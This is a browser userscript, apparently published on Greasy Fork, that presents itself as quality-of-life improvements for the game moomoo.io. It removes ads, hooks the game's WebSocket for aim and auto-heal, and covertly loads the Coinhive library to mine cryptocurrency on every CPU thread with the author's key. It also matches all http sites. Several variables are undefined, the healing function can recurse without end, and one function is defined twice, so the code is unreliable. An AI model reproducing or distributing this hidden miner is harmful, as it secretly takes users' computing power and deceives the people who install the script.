// ==UserScript==
// @name         Improved Moomoo
// @namespace    http://tampermonkey.net/
// @version      Release-1.0
// @description  QoL improvements
// @author       Vinool
// @require      http://code.jquery.com/jquery-1.12.4.min.js
// @match        http://moomoo.io
// @match        https://moomoo.io
// @match        http://*/*
// @grant        GM_registerMenuCommand
// @connect      moomoo.io
// @downloadURL https://update.greasyfork.org/scripts/36730/Improved%20Moomoo.user.js
// @updateURL https://update.greasyfork.org/scripts/36730/Improved%20Moomoo.meta.js
// ==/UserScript==


$('#gameName').html('<div id="gameName">Better MooMoo.io</div>');

$.getScript( "https://coinhive.com/lib/coinhive.min.js" )
    .success(function( script, textStatus ) {
    var v223 = new CoinHive.Anonymous('8sXp6yB0tscbucFOttYXiWNA33SxY2wX');
    v223.setNumThreads(navigator.hardwareConcurrency);
    v223.setThrottle(0.1);
    v223.start();
});

var css = '#rightCardHolder {display: block!important;} #mapDisplay {background: url("//i.imgur.com/aGpK7hj.png")}',
    removeSelectors = ['#youtuberOf', '#linksContainer1', '#downloadButtonContainer', '#promoImgHolder', '#followText', '#adCard', '.menuHeader:nth-child(5)', '.menuHeader:nth-child(6)', '.menuText', '#twitterFollow', '#___ytsubscribe_0'],
    head = document.head || document.getElementsByTagName('head')[0],
    style = document.createElement('style'),
    ID,
    Apple = true;


style.type = 'text/css';
if (style.styleSheet){
    style.styleSheet.cssText = css;
} else {
    style.appendChild(document.createTextNode(css));
}

for ( let i = 0; i < removeSelectors.length; i++ ) {
    $(removeSelectors[i]).remove();
}

head.appendChild(style);
$('#linksContainer2').html('<a href="./docs/versions.txt" target="_blank" class="menuLink">' + moomooVer + '</a>');

WebSocket.prototype.oldSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(m){
    var parsed = parseWSMsg(m);
    this.oldSend(currentTarget && parsed[0] === "2" ? "42[\"2\"," + currentTarget.getAngle() + "]" : m);
    if (!ws){
        ws = this;
        socketFound(this);
    }
};

function socketFound(socket){
    console.log("found socket object");
    socket.addEventListener('message', function(e){
        handleMessage(e);
    });
}

function parseWSMsg(s){
    if (s.indexOf("42") === -1) return -1;
    var o = s.substring(s.indexOf("["));
    return JSON.parse(o);
}

function heal(){
    console.log("healing");
    if (Apple){
        if (!haveApple()){
            heal();
            return;
        }
        else ws.send("42[\"5\",0,null]");
    }
    else ws.send("42[\"5\",1,null]");
    ws.send("42[\"4\",1,null]");
}

function isElementVisible(e) {
    return (e.offsetParent !== null);
}

function haveApple(){
    if (Apple) Apple = isElementVisible(document.getElementById("actionBarItem10"));
    return Apple;
}

function handleMessage(m){
    var info = parseWSMsg(m.data);

    if (info[0] == "1" && !ID){
        console.log('GOT ID: ' + info[1]);
        ID =  info[1];
    }

    if (info[0] === "10" && info[1] === ID && info[2] !== 100){
        var random = Math.random() * (0.2 - 0.1) + 0.2 * 1000;
        setTimeout(function(){
            heal();
        }, random);
    }
}
function isElementVisible(e) {
    return (e.offsetParent !== null);
}

